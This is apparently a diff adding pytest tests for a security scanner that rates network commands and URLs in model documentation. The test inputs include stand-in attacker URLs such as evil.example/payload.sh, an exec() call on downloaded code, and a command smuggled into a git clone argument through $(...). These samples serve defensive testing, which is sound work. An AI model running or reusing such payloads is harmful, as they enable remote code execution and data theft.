+        "```bash\nlauncher=python\n$launcher repo/install.py\n```\n",
+        "```bash\ncmake -B build -P repo/install.cmake\n```\n",
+        "```python\nimport subprocess\nsubprocess.run(['python', 'repo/install.py'])\n```\n",
+        "```python\nimport runpy\nrunpy.run_path('repo/install.py')\n```\n",
+        "```bash\npython repo/install.py\n",
+    ],
+)
+def test_documented_clone_script_chains_across_blocks_remain_actionable(tmp_path: Path, execution: str) -> None:
+    content = "```bash\ngit clone https://github.com/owner/repo.git\n```\n\nRun the next step:\n\n" + execution
+    result = _scan_text_content(tmp_path / "README.md", content)
+    assert any(
+        check.details.get("type") == "network_command"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(scan_model_directory_or_file(str(tmp_path / "README.md"), cache_enabled=False)) == 1
+
+
+@pytest.mark.parametrize(
+    "prefix,indent",
+    [
+        ("- Setup\n\n", "    "),
+        ("1. Setup\n\n", "    "),
+        ("- Setup\n  - Install\n\n", "      "),
+        ("> - Setup\n>\n", ">    "),
+    ],
+)
+@pytest.mark.parametrize("execute", [False, True])
+def test_documented_clone_in_list_fences_preserves_policy(
+    tmp_path: Path, prefix: str, indent: str, execute: bool
+) -> None:
+    content = prefix + "\n".join(
+        indent + line for line in ["```bash", "git clone https://github.com/owner/repo.git", "```", ""]
+    )
+    if execute:
+        content += "\n".join(indent + line for line in ["```bash", "python repo/install.py", "```", ""])
+    path = tmp_path / "README.md"
+    result = _scan_text_content(path, content)
+    checks = [check for check in result.checks if check.details.get("type") == "network_command"]
+    assert checks
+    assert any(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in checks) is execute
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == int(execute)
+
+
+@pytest.mark.parametrize("complete", [False, True])
+def test_documented_clone_fence_on_list_marker(tmp_path: Path, complete: bool) -> None:
+    content = "- ```bash\n  git clone https://github.com/owner/repo.git\n" + ("  ```\n" if complete else "")
+    path = tmp_path / "README.md"
+    result = _scan_text_content(path, content)
+    checks = [check for check in result.checks if check.details.get("type") == "network_command"]
+    assert checks
+    assert any(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in checks) is not complete
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == int(not complete)
+
+
+@pytest.mark.parametrize(
+    "following",
+    [
+        "```bash\npip install -e .\n```\n",
+        "```bash\npython3 -m pip install --index-url=https://pypi.org/simple/ torch\n```\n",
+        "```bash\npython3 --version\n```\n",
+        "```bash\npython3 -h\n```\n",
+        "```bash\ncommand -v python3\n```\n",
+        "```console\n$ python3 --version\n```\n",
+        "```console\n$ command -v python3\n```\n",
+        '```bash\necho "python repo/install.py"\n```\n',
+        "```bash\necho '`python repo/install.py`'\n```\n",
+        "```bash\necho '$(python repo/install.py)'\n```\n",
+        '```bash\necho "\\$(python repo/install.py)"\n```\n',
+        '```bash\necho "\\`python repo/install.py\\`"\n```\n',
+        "```bash\ncat <<'EOF'\npython repo/install.py\nEOF\n```\n",
+        '```bash\ncat <<"EOF"\n$(python repo/install.py)\nEOF\n```\n',
+        "```bash\ncat <<-'EOF'\n\tpython repo/install.py\n\tEOF\n```\n",
+        "```bash\necho foo # python repo/install.py\n```\n",
+        "```bash\necho foo;# python repo/install.py\n```\n",
+        '```bash\necho "foo#bar; python repo/install.py"\n```\n',
+        "```bash\necho 'python${IFS}-m${IFS}repo.install'\n```\n",
+        '```bash\necho "${HOME}"\n```\n',
+        '```bash\necho "./repo/install.exe"\n```\n',
+        '```bash\necho "./repo/install"\n```\n',
+        "```bash\nls repo/bin\n```\n",
+        "```bash\ncat repo/install\n```\n",
+        "```bash\ncommand -v ./repo/bin/tool\n```\n",
+        "The file `repo/bin/tool` contains the installer.\n",
+        "The model supports `float32 and float16` precision.\n",
+        "The default shape is `(batch, sequence, hidden)`.\n",
+        "The input shape is <code>(1, steps, 768)</code>.\n",
+        '```python\nprint("ctypes.CDLL(./repo/plugin.so)")\n```\n',
+        "```python\nimport ctypes\nvalue = ctypes.c_int(1)\n```\n",
+        "```console\nPython.exe --version\n```\n",
+        "```console\npy --version\n```\n",
+        "```bash\necho 'trap python repo/install.py EXIT'\n```\n",
+        '```python\nimport pickle\npickle.Pickler(stream).dump({"value": 1})\n```\n',
+        '```python\nprint("pickle.Unpickler(stream).load()")\n```\n',
+        '```python\nname = getattr(model, "name")\n```\n',
+        "Run the following command:\npython --version\n",
+        '```bash\n>output.log echo "python repo/install.py"\n```\n',
+        "```bash\n> output.log python --version\n```\n",
+        '```bash\nif python --version; then echo "python repo/install.py"; fi\n```\n',
+        '```bash\ntime echo "python repo/install.py"\n```\n',
+        'Run the following command:\n\necho "python repo/install.py"\n',
+        "```bash\nvllm serve ./repo\n```\n",
+        "```bash\nvllm serve ./repo --host 0.0.0.0 --port=8000 --tensor-parallel-size 2\n```\n",
+        '```python\nimport torch\ntorch.load("repo/model.pt", weights_only=True)\n```\n',
+        '```\nprint("repo/install.py")\n```\n',
+        '```\n"repo/install.py"\n```\n',
+        '```json\n{"script": "repo/install.py"}\n```\n',
+        "```bibtex\n@article{example,\n    title = {Example model}\n}\n```\n",
+        '    print("python repo/install.py")\n',
+        "    python3 --version\n",
+        "The file `repo/install.py` contains the installer.\n",
+        "The `subprocess.run` API can invoke subprocesses.\n",
+        "Check `python3 --version` first.\n",
+        'Print a path with `print("repo/install.py")`.\n',
+        '    print("`python repo/install.py`")\n',
+        "<pre><code>python3 --version</code></pre>\n",
+        '<pre><code>print("python repo/install.py")</code></pre>\n',
+        "The file <code>repo/install.py</code> contains the installer.\n",
+        "The `<pre><code>` tags display code examples.\n",
+        "The &lt;pre&gt;&lt;code&gt; tags display code examples.\n",
+        "Run python3 --version\n",
+        "Run: python3 --version\n",
+        "> ```bash\n> python3 --version\n> ```\n",
+        ">     python3 --version\n",
+        "Run <b>python3</b> --version\n",
+        "<p>Run</p><p>python3 --version</p>\n",
+        "Run the example when you're ready.\n",
+        "The source code is available in the cloned repository.\n",
+        "<!-- Run python repo/install.py next. -->\n",
+        "<!-- Run `python repo/install.py` next. -->\n",
+        "<!-- Run `python repo/install.py` next. -->\nRun python3 --version\n",
+        '```bash\necho "&&" python repo/install.py\n```\n',
+        '```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n```\n',
+    ],
+)
+def test_documented_clone_with_separate_routine_examples_is_informational(tmp_path: Path, following: str) -> None:
+    content = "```bash\ngit clone https://github.com/owner/repo.git\n```\n\n" + following
+    result = _scan_text_content(tmp_path / "README.md", content)
+    checks = _failed_network_detection_checks(result)
+    assert checks and all(check.severity == IssueSeverity.INFO for check in checks)
+    assert determine_exit_code(scan_model_directory_or_file(str(tmp_path / "README.md"), cache_enabled=False)) == 0
+
+
+@pytest.mark.parametrize(
+    "url",
+    [
+        "https://evil.example/v1",
+        "http://localhost.evil.example:8000/v1",
+        "http://localhost:8000@evil.example/v1",
+        "http://user:password@localhost:8000/v1",
+        "http://localhost:1337/v1",
+        "http://localhost:8080/v1",
+        "http://localhost:8000/shell",
+        "http://localhost:8000/payload.py",
+        "http://localhost:8000/v1?token=secret",
+        "http://localhost:8000/v1#payload",
+        "http://localhost:8000/%76%31",
+    ],
+)
+def test_documented_client_preserves_suspicious_endpoints(tmp_path: Path, url: str) -> None:
+    _assert_documentation_network_actionable(
+        tmp_path, f'```python\nclient = OpenAI(base_url="{url}")\n```\n', "url_detected"
+    )
+
+
+@pytest.mark.parametrize(
+    "source",
+    [
+        'client = OpenAI(base_url=f"http://localhost:8000/v1{suffix}")',
+        'client = OpenAI(base_url="http://localhost:8000/v1" + suffix)',
+        'client = OpenAI(base_url="http://localhost:8000/v1")\nexec(source)',
+        'system = exec\nclient = OpenAI(base_url="http://localhost:8000/v1")\nsystem(source)',
+        'system = "data"\nsystem = os.system\nclient = OpenAI(base_url="http://localhost:8000/v1")\nsystem(source)',
+        'system = "data"\ndef run(system):\n    executor = system\n    executor(source)\n'
+        'client = OpenAI(base_url="http://localhost:8000/v1")',
+        'system = "data"\nglobals()["system"] = callback\nexecutor = system\nexecutor(source)\n'
+        'client = OpenAI(base_url="http://localhost:8000/v1")',
+        'executor = system\nsystem = "data"\nexecutor(source)\nclient = OpenAI(base_url="http://localhost:8000/v1")',
+        'def prompt():\n    system = "data"\nexecutor = system\nexecutor(source)\n'
+        'client = OpenAI(base_url="http://localhost:8000/v1")',
+        'import subprocess as sp\nclient = OpenAI(base_url="http://localhost:8000/v1")\nsp.run(command)',
+        'client = OpenAI(base_url="http://localhost:8000/v1"',
+        'messages = [{"role": "user", "content": "https://qwenlm.github.io/blog/"}]\nexec(messages[0]["content"])',
+        'messages = [{"role": "user", "content": "https://qwenlm.github.io/blog/"}]\nother = messages',
+        'messages = [{"role": "user", "content": "https://evil.example/payload.sh"}]',
+        'messages = [{"role": "user", "content": "https://qwenlm.github.io/blog/ https://evil.example/payload.sh"}]',
+        'messages = [{"role": "user", "content": "https://qwenlm.github.io/blog/payload.sh"}]',
+        'messages = [{"role": "user", "content": "https://qwenlm.github.io/blog/payload"}]',
+    ],
+)
+def test_documented_python_preserves_payloads_and_unproven_values(tmp_path: Path, source: str) -> None:
+    _assert_documentation_network_actionable(tmp_path, f"```python\n{source}\n```\n", "url_detected")
+
+
+@pytest.mark.parametrize("filename", ["config.txt", "payload.md", "README.txt"])
+def test_routine_example_policy_is_limited_to_markdown_model_cards(tmp_path: Path, filename: str) -> None:
+    result = _scan_text_content(
+        tmp_path / filename, '```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n```\n'
+    )
+    assert any(
+        check.severity == IssueSeverity.WARNING and check.details.get("type") == "url_detected"
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize("filename", ["README", "model_card"])
+def test_routine_examples_in_extensionless_markdown_model_cards_are_informational(
+    tmp_path: Path, filename: str
+) -> None:
+    path = tmp_path / filename
+    result = _scan_text_content(path, "```bash\ngit clone https://github.com/owner/repo.git\n```\n")
+    checks = _failed_network_detection_checks(result)
+    assert checks and all(check.severity == IssueSeverity.INFO for check in checks)
+    assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 0
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        'client = OpenAI(base_url="http://localhost:8000/v1")\n',
+        '```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n',
+        '```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n~~~\n',
+        '```text\n```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n```\n',
+        '```\nfrom openai import OpenAI\nexec(requests.get("http://localhost:8000/v1").text)\n```\n',
+        "```python\n# " + "x" * (16 * 1024) + '\nclient = OpenAI(base_url="http://localhost:8000/v1")\n```\n',
+        "```text\nexample\n```\n" * 129 + '```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n```\n',
+    ],
+)
+def test_routine_example_policy_requires_complete_bounded_fences(tmp_path: Path, content: str) -> None:
+    _assert_documentation_network_actionable(tmp_path, content, "url_detected")
+
+
+@pytest.mark.parametrize(
+    ("citation", "routine"),
+    [
+        (b'@article{key, title = "Models, part one", year = 2025}', True),
+        (b"@article{key, title = {A, B}, year = 2025, }", True),
+        (b"@article{key, title = {A} year = 2025}", False),
+        (b"@article{key, year = 2025", False),
+    ],
+)
+def test_routine_clone_with_bibtex_fields(citation: bytes, routine: bool) -> None:
+    from modelaudit.scanners.text_scanner_support.documentation_examples import routine_documentation_network_spans
+
+    document = b"```sh\ngit clone https://github.com/example/model\n```\n```bibtex\n" + citation + b"\n```\n"
+    assert bool(routine_documentation_network_spans(document)) is routine
+
+
+def test_documented_clone_ignores_non_utf8_url_in_shell_comment() -> None:
+    from modelaudit.scanners.text_scanner_support.documentation_examples import routine_documentation_network_spans
+
+    url = b"https://github.com/example/model"
+    source = b"```console\n  $ git clone " + url + b" # mirror https://example.org/caf\xe9\n```\n"
+    start = source.index(url)
+    assert routine_documentation_network_spans(source) == ((start, start + len(url)),)
+
+
+@pytest.mark.parametrize(
+    ("example", "routine"),
+    [
+        ("import numpy as np\nnp.load('repo/data.npy')", True),
+        ("from numpy import load as read\nread('repo/data.npy', allow_pickle=False)", True),
+        ("import numpy as np\nnp.load('repo/data.npy', allow_pickle=True)", False),
+        ("import numpy as np\nnp.load('repo/data.npy', None, flag)", False),
+        ("import numpy as np\nnp.load('repo/data.npy', **options)", False),
+        ("import yaml as y\ny.safe_load(stream)", True),
+        ("from yaml import load, SafeLoader as L\nload(stream, Loader=L)", True),
+        ("import yaml as y\ny.load_all(stream, y.CSafeLoader)", True),
+        ("import yaml as y\ny.unsafe_load(stream)", False),
+        ("from yaml import unsafe_load_all as read\nread(stream)", False),
+        ("import yaml as y\ny.load(stream, Loader=y.UnsafeLoader)", False),
+        ("import yaml as y\ny.load_all(stream, **options)", False),
+    ],
+)
+def test_clone_exemption_requires_safe_loader_options(example: str, routine: bool) -> None:
+    from modelaudit.scanners.text_scanner_support.documentation_examples import routine_documentation_network_spans
+
+    source = f"```sh\ngit clone https://github.com/example/model\n```\n```python\n{example}\n```\n".encode()
+    assert bool(routine_documentation_network_spans(source)) is routine
+
+
+def test_routine_example_policy_bounds_whole_document_analysis(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    from modelaudit.scanners.text_scanner_support import documentation_examples
+
+    def unexpected_parse(_payload: bytes) -> None:
+        pytest.fail("An oversized document reached Markdown parsing")
+
+    monkeypatch.setattr(documentation_examples, "_without_markdown_container_prefixes", unexpected_parse)
+    content = "```bash\ngit clone https://github.com/owner/repo.git\n```\n" + "x" * (
+        documentation_examples.MAX_DOCUMENTATION_BYTES + 1
+    )
+    _assert_documentation_network_actionable(tmp_path, content, "network_command")
+
+
+@pytest.mark.parametrize("filename", ["README.md", "config.txt", "README.env", "README.md.env"])
+def test_http_request_reports_its_evidence_source(tmp_path: Path, filename: str) -> None:
+    content = "```bash\ncurl -X POST http://localhost:8080/embed -d @inputs.json\n```\n"
+    path = tmp_path / filename
+    result = _scan_text_content(path, content)
+    url_check = next(check for check in result.checks if check.details.get("type") == "url_detected")
+    assert url_check.severity == IssueSeverity.CRITICAL
+    if filename == "README.md":
+        assert url_check.message == "URL detected in documentation: http://localhost:8080/embed"
+        assert url_check.details["evidence_source"] == "documentation"
+        assert url_check.why and "documentation" in url_check.why
+        assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 1
+    else:
+        assert "evidence_source" not in url_check.details
+        assert url_check.why == "Models should not contain network communication capabilities"
+
+
+@pytest.mark.parametrize(
+    ("source", "url"),
+    [
+        (b"~~~sh\ncurl -X POST http://127.0.0.1:8080/embed -d @inputs.json\n~~~\n", "http://127.0.0.1:8080/embed"),
+        (
+            b"~~~python\nfrom openai import OpenAI\n"
+            b'client = OpenAI(base_url="http://localhost:8080/v1", api_key="demo")\n'
+            b'client.chat.completions.create(model="sample", messages=[])\n~~~\n',
+            "http://localhost:8080/v1",
+        ),
+    ],
+)
+def test_documented_request_report_attributes_the_url_to_its_source(tmp_path: Path, source: bytes, url: str) -> None:
+    path = tmp_path / "README.md"
+    path.write_bytes(source)
+    result = scan_model_directory_or_file(str(path), cache_enabled=False)
+    issue = next(issue for issue in result.issues if issue.details.get("url") == url)
+    assert determine_exit_code(result) == 1
+    assert issue.severity == IssueSeverity.CRITICAL
+    assert issue.details["evidence_source"] == "documentation"
+    assert issue.details["position"] == source.index(url.encode())
+    assert issue.message == f"URL detected in documentation: {url}"
+    assert issue.why == (
+        "This indicator appears in documentation. Any network access depends on how the documented "
+        "code, configuration, or tools are used."
+    )
+
+
+def test_truncated_document_keeps_fully_inspected_local_client_informational(tmp_path: Path) -> None:
+    path = tmp_path / "README.md"
+    example = b'~~~python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n~~~\n'
+    path.write_bytes(example + b"additional text\n")
+    result = TextScanner(config={"text_content_scan_bytes": len(example)}).scan(str(path))
+    checks = [check for check in result.checks if check.details.get("type") == "url_detected"]
+    assert checks and all(check.severity == IssueSeverity.INFO for check in checks)
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+
+
+def test_unlabelled_fence_requires_a_known_loopback_client(tmp_path: Path) -> None:
+    content = '~~~\nfrom openai import OpenAI\nunknown(base_url="http://localhost:8000/v1")\n~~~\n'
+    _assert_documentation_network_actionable(tmp_path, content, "url_detected")
+
+
+def test_truncated_document_keeps_clone_actionable(tmp_path: Path) -> None:
+    path = tmp_path / "README.md"
+    prefix = b"~~~sh\ngit clone https://github.com/example/model\n~~~\n"
+    path.write_bytes(prefix + b"~~~sh\npython model/install.py\n~~~\n")
+    result = TextScanner(config={"text_content_scan_bytes": len(prefix)}).scan(str(path))
+    checks = [check for check in result.checks if check.details.get("type") == "network_command"]
+    assert checks and all(check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for check in checks)
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+
+
+def test_documented_prompt_url_preserves_repeated_shell_destination(tmp_path: Path) -> None:
+    path = tmp_path / "README.md"
+    source = (
+        b'~~~\nfrom openai import OpenAI\nclient = OpenAI(base_url="http://localhost:8000/v1")\n'
+        b'messages = [{"role": "user", "content": "https://project.github.io/docs/ Summarize this."}]\n~~~\n'
+        b"~~~sh\ncurl project.github.io\n~~~\n"
+    )
+    path.write_bytes(source)
+    result = TextScanner().scan(str(path))
+    assert any(
+        check.details.get("domain") == "project.github.io"
+        and check.details.get("position") == source.rindex(b"project.github.io")
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in _failed_network_detection_checks(result)
+    )
+
+
+def test_routine_example_does_not_hide_later_same_url_execution(tmp_path: Path) -> None:
+    content = (
+        '```python\nclient = OpenAI(base_url="http://localhost:8000/v1")\n```\n'
+        '```python\nexec(requests.get("http://localhost:8000/v1").text)\n```\n'
+    )
+    result = _scan_text_content(tmp_path / "README.md", content)
+    checks = [check for check in result.checks if check.details.get("type") == "url_detected"]
+    assert [check.severity for check in checks] == [IssueSeverity.INFO, IssueSeverity.WARNING]
+    _assert_documentation_network_actionable(tmp_path, content, "network_function")
+
+
+def test_routine_example_keeps_blacklisted_destination_alerts(tmp_path: Path) -> None:
+    path = tmp_path / "README.md"
+    path.write_text("```bash\ngit clone https://github.com/example/model.git\n```\n", encoding="utf-8")
+    result = TextScanner({"network_comm_config": {"custom_blacklist": ["github.com/example"]}}).scan(str(path))
+    assert any(
+        check.details.get("type") == "blacklisted_domain" and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git clone https://github.com/owner/repo.git $(python payload.py)",
+        'echo "\ngit clone https://github.com/owner/repo.git\n"',
+        "git clone https://github.com/owner/repo.git\x0bpython payload.py",
+    ],
+)
+def test_routine_setup_proof_rejects_shell_substitution_and_incomplete_strings(command: str) -> None:
+    from modelaudit.scanners.text_scanner_support.documentation_examples import routine_documentation_network_spans
+
+    assert routine_documentation_network_spans(f"```bash\n{command}\n```\n".encode()) == ()
+
+
 def _assert_documentation_routed_to_text(tmp_path: Path, filename: str) -> None:
     text_path = tmp_path / filename
     text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")
@@ -5280,6 +7658,6 @@ def _assert_bibliography_informational(tmp_path: Path, content: str) -> None:
 
 
 def _scan_text_content(text_path: Path, content: str) -> ScanResult:
-    text_path.write_text(content, encoding="utf-8")
+    text_path.write_bytes(content.encode("utf-8"))
     result = TextScanner().scan(str(text_path))
     return result
